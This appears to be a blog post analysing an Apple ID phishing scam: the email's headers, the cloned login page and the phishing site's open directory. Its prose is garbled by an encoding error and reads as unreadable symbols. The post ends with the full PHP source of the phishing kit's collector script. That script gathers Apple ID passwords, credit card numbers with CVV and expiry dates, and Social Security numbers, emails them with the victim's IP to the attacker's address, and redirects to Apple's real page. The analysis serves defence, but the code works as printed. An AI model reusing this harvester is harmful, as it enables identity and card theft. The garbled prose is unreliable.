&lt;p&gt;Êî∂Âà∞ÊÉ°ÊÑèÈÉµ‰ª∂„ÄÅÈá£È≠öÈÉµ‰ª∂Ôºå‰∏ÄÂÆöË¶ÅÂ•ΩÂ•ΩÁúã‰ø°‰ª∂ÁöÑÊ®ôÈ†≠Ê™îÔºàHeaderÔºâ„ÄÇË£°Èù¢ÈÄöÂ∏∏ÂèØ‰ª•ÁúãÂà∞ÊîªÊìäËÄÖÁôº‰ø°ÁöÑ‰æÜÊ∫êÔºå‰æãÂ¶ÇÊòØËá™Â∑±Êû∂Ë®≠ÁöÑÁôº‰ø°‰º∫ÊúçÂô®ÊàñËÄÖÊòØ‰ΩøÁî®ËÇâÈõû‰æÜÁôº‰ø°„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-02.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-02.png&quot; alt=&quot;Apple ID Èá£È≠ö‰ø° Header&quot; title=&quot;Apple ID Èá£È≠ö‰ø° Header&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;‰ø°‰ª∂Ê®ôÈ†≠ÊúÄÈáçË¶ÅÁöÑÂ∞±ÊòØ„ÄåReceived„ÄçÈÄôÂÄãÈÉ®ÂàÜÔºåË¶ÅÁî±‰∏ãÂæÄ‰∏äÈñ±ËÆÄ„ÄÇÂæûÈÄôÈÇäÊàëÂÄëÂèØ‰ª•ÁúãÂà∞‰ø°‰ª∂ÁöÑÊµÅÂêëÔºåÂæûÊîªÊìäÁôºËµ∑ËÄÖÂà∞Áôº‰ø°‰º∫ÊúçÂô®Ôºå‰∏≠ÈñìÁ∂ìÈÅéÂÖ∂‰ªñ‰º∫ÊúçÂô®ÁöÑËΩâÈÄÅÔºåÊúÄÂæåÂà∞Êî∂Âà∞Èá£È≠ö‰ø°‰ª∂ÁöÑÈÉµ‰ª∂‰º∫ÊúçÂô®„ÄÇÂõ†Ê≠§ÂæûÊúÄ‰∏ãÈù¢ÁöÑ Received ‰ΩçÁΩÆÔºåÊàëÂÄëÂèØ‰ª•Áü•ÈÅìÊîªÊìäËÄÖÊòØÂæû„Äåselecttr@cloud.httpdns.co„Äç‰æÜÂØÑÈÄÅ‰ø°‰ª∂ÁöÑÔºåÂõ†Ê≠§ cloud.httpdns.co ÂæàÊúâÂèØËÉΩÂ∞±ÊòØÊîªÊìäËÄÖÁöÑ‰º∫ÊúçÂô®ÔºåÊàñËÄÖÊòØË¢´Èß≠‰æÜÁôº‰ø°ÁöÑ‰º∫ÊúçÂô®„ÄÇ&lt;/p&gt;

&lt;p&gt;Â¶ÇÊûúË¶∫Âæó‰ø°‰ª∂ÁöÑÊ®ôÈ†≠Â§™Èï∑Èõ£‰ª•Èñ±ËÆÄÔºåÂèØ‰ª•Âà©Áî® Google Êèê‰æõÁöÑÂ∑•ÂÖ∑„Äå&lt;a href=&quot;https://toolbox.googleapps.com/apps/messageheader/&quot;&gt;Google Apps Toolbox - Messageheader&lt;/a&gt;„Äç„ÄÇÂè™Ë¶ÅÊää‰ø°‰ª∂ÁöÑÊ®ôÈ†≠Ë≤º‰∏äÔºå‰ªñÂ∞±ÊúÉËá™ÂãïÂàÜÊûê‰ø°‰ª∂ÁöÑÊµÅÂêëÔºåÂ¶Ç‰∏ãÂúñ„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-08.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-08.png&quot; alt=&quot;Ê™¢Êü•‰ø°‰ª∂ header&quot; title=&quot;Ê™¢Êü•‰ø°‰ª∂ header&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;Èá£È≠öÁ∂≤È†Å‰πüË´ã‰Ω†Ê≥®ÈáçÂÆâÂÖ®Âïä&quot;&gt;Èá£È≠öÁ∂≤È†ÅÔºå‰πüË´ã‰Ω†Ê≥®ÈáçÂÆâÂÖ®Âïä„ÄÇ&lt;/h3&gt;

&lt;p&gt;Êé•ËëóÊàëÂÄë‰æÜÁúã‰∏Ä‰∏ãÈá£È≠öÈ†ÅÈù¢„ÄÇÈÄöÂ∏∏„ÄåÊ≠£Â∏∏„ÄçÁöÑÈá£È≠öÈ†ÅÈù¢ÈÉΩÊúÉÂÅöÂæóË∑üÂÆòÊñπ‰∏ÄÊ®°‰∏ÄÊ®£ÔºåÂõ†ÁÇ∫ÈÄöÂ∏∏ÊîªÊìäËÄÖÈÉΩÊúÉÁõ¥Êé•ÊääÂÆòÊñπÁ∂≤Á´ô‰∏äÈù¢ÁöÑ HTML Áõ¥Êé•‰∏ãËºâ‰∏ã‰æÜ‰øÆÊîπ„ÄÇÂ¶ÇÊûúÊúâÂÅöÂæó‰∏çÂÉèÁöÑÔºåÂ∞±ÁúüÁöÑÊòØÂ§™‰∏çÁî®ÂøÉÁöÑÊîªÊìäËÄÖ„ÄÇ&lt;/p&gt;

&lt;p&gt;ÊàëÂÄëÂèØ‰ª•ÁúãÂà∞ÈÄôÂÄãÈá£È≠öÈ†ÅÈù¢ÂÅöÂæóÈùûÂ∏∏ÂÉèÔºå‰∏äÈù¢Ë¶Å‰Ω†Ëº∏ÂÖ•Â∏≥Ëôü„ÄÅÂØÜÁ¢º„ÄÅÂßìÂêç„ÄÅÁîüÊó•„ÄÅ‰ø°Áî®Âç°ËôüÁ≠âË≥áË®äÔºåÈùûÂ∏∏ÊÉ°Âä£„ÄÇÂîØÊúâÁ∂≤ÂùÄÂØ¶Âú®ÊòØÂ§™ÂÅáÔºåÂ∏åÊúõÊ≤íÊúâ‰∫∫ÁúºÊãôÁúüÁöÑ‰ª•ÁÇ∫ÈÄôÊòØ Apple ÁöÑÁ∂≤Á´ô„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-04.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-04.png&quot; alt=&quot;Apple ID Èá£È≠öÁ∂≤È†Å&quot; title=&quot;Apple ID Èá£È≠öÁ∂≤È†Å&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ÁßâÊåÅÁöÑË≥áÂÆâÁ†îÁ©∂Âì°ÁöÑÂ•ΩÁøíÊÖ£ÔºåÊàëÂÄëÊääÁ∂≤ÂùÄÂ≠êÁõÆÈåÑÂéªÊéâÔºåÁúãÁúãÁ∂≤Á´ôÁöÑÊ†πÁõÆÈåÑÈï∑‰ªÄÈ∫ºÊ®£Â≠êÔºåÁµêÊûúËÆì‰∫∫Ë∑åÁ†¥ÁúºÈè°„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-03.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-03.png&quot; alt=&quot;Èá£È≠öÁ∂≤È†ÅÈñãÊîæÁõÆÈåÑÁÄèË¶Ω&quot; title=&quot;Èá£È≠öÁ∂≤È†ÅÈñãÊîæÁõÆÈåÑÁÄèË¶Ω&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Èá£È≠öÁ∂≤Á´ô‰πüË´ã‰Ω†Ê≥®ÈáçÂÆâÂÖ®ÂïäÔºÅ&lt;/strong&gt;ÈÄôÂÄãÁ∂≤Á´ôÂ§ßÂâåÂâåÁöÑÈñãËëóÁõÆÈåÑÁ¥¢ÂºïÔºåËÆìÊàëÂÄëÂèØ‰ª•ÁúãÂà∞Á∂≤Á´ô‰∏äÁöÑÂêÑÂÄãÁõÆÈåÑ„ÄÅÊ™îÊ°à„ÄÇÈô§‰∫Ü Apple ÁöÑÈá£È≠öÁ∂≤È†Å‰πãÂ§ñÔºåÁîöËá≥ÊúâÈá£È≠öÁ∂≤È†ÅÁöÑÂéüÂßãÁ¢º„Äåconnect-info.zip„ÄçÔºåÊõ¥ÊúâËëóÂÖ∂‰ªñÈá£È≠öÁ∂≤È†ÅÂú®ÂêåÂÄãÁ´ô‰∏ä„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-05.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-05.png&quot; alt=&quot;Á´ô‰∏äÂÖ∂‰ªñÈá£È≠öÈ†ÅÈù¢&quot; title=&quot;Á´ô‰∏äÂÖ∂‰ªñÈá£È≠öÈ†ÅÈù¢&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Êó¢ÁÑ∂ÂèØ‰ª•ÁÄèË¶ΩÔºåÈÇ£ÊàëÂÄë‰æÜÁúãÁúãÈá£È≠öÁ∂≤È†ÅÁöÑÂéüÂßãÁ¢ºÂØ´ÂæóÊÄéÊ®£„ÄÇÊäì‰∏ã‰æÜËß£Èñã‰πãÂæåÊúÉÁúãÂà∞ÂÆåÊï¥ÁöÑÈá£È≠öÁ∂≤È†ÅÔºå‰ª•ÂèäÊé•Êî∂ÂèóÈ®ô‰∫∫Ë≥áÊñôÁöÑ‰∏ªÁ®ãÂºè„ÄåSnd.php„Äç„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-06.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-06.png&quot; alt=&quot;‰∏ãËºâÈá£È≠öÁ∂≤È†ÅÂéüÂßãÁ¢º&quot; title=&quot;‰∏ãËºâÈá£È≠öÁ∂≤È†ÅÂéüÂßãÁ¢º&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Èá£È≠öÁ∂≤È†ÅÁöÑÁ®ãÂºèÂØ´ÂæóÈùûÂ∏∏Á∞°ÂñÆÔºåÂÉÖÊääÁ∂≤È†Å‰∏äÊé•Êî∂Âà∞ÁöÑË¢´ÂÆ≥‰∫∫Ë≥áÊñô„ÄÅIPÔºåÂØÑÈÄÅÂà∞‰ªñÁöÑ‰ø°ÁÆ±„Äå justforhacke@gmail.com „ÄçÔºåÂØÑÈÄÅÂÆåÁï¢ÂæåÊúÉËá™ÂãïÂ∞éÂêëÂà∞ÂÆòÊñπÁöÑÈ†ÅÈù¢ÂÅΩË£ù„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-07.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-07.png&quot; alt=&quot;Èá£È≠öÁ∂≤È†ÅÂéüÂßãÁ¢º&quot; title=&quot;Èá£È≠öÁ∂≤È†ÅÂéüÂßãÁ¢º&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Â¶ÇÊûúÈá£È≠öÁ∂≤È†ÅÂØ´Âæó‰∏çÂ•ΩÔºåÁîöËá≥ÊàëÂÄëÊúâÊ©üÊúÉÂèØ‰ª•ÊîªÊìä‰ªñÈá£È≠öÁ∂≤È†Å‰∏äÁöÑÊºèÊ¥ûÔºåÁõ¥Êé•ÂèñÂæó‰∏ªÊ©üÁöÑÊ¨äÈôêÔºåËß£Êïë‰∏ñ‰∫∫„ÄÇÂæûÂéüÂßãÁ¢ºÊàëÂÄë‰∏ÄÁõÆ‰∫ÜÁÑ∂Èá£È≠öÁ∂≤È†ÅÁöÑË°åÁÇ∫„ÄÅÂØ´Ê≥ïÔºå‰πüÂèØ‰ª•Â∞ãÊâæÊúâÁÑ°ÊîªÊìäÁöÑÊ©üÊúÉ„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;Èá£È≠öÁ∂≤È†ÅÂéüÂßãÁ¢ºÂÇô‰ªΩ&quot;&gt;Èá£È≠öÁ∂≤È†ÅÂéüÂßãÁ¢ºÂÇô‰ªΩ&lt;/h4&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;getenv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;REMOTE_ADDR&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$hostname&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;gethostbyaddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;------------+| AppLe VbV |+------------&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Apple ID                    : &quot;&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;donnee000&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Password                    : &quot;&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;donnee001&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Full Name                   : &quot;&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;donnee01&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Date of Birth               : &quot;&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;donnee02&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;donnee3&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;donnee4&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Number Of Credit Card       : &quot;&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;donnee5&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;CVC (CVV)                   : &quot;&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;donnee6&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Expiration Date             : &quot;&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;donnee7&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;donnee8&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Social Security Number      : &quot;&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;donnee9&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;------------+| APpLe VBV |+------------&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Fr0m &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;            &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;


&lt;span class=&quot;nv&quot;&gt;$bilsnd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;justforhacke@gmail.com&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsub&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Apple Result | Fr0m &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilhead&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;From: Apple Results &amp;lt;justforhacke@gmail.com&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilhead&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;eMailAdd&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilhead&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;MIME-Version: 1.0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$arr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$bilsnd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;foreach&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$arr&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$bilsnd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;mail&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$bilsnd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$bilsub&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$bilhead&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;Location:https://itunesconnect.apple.com/WebObjects/iTunesConnect.woa/&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

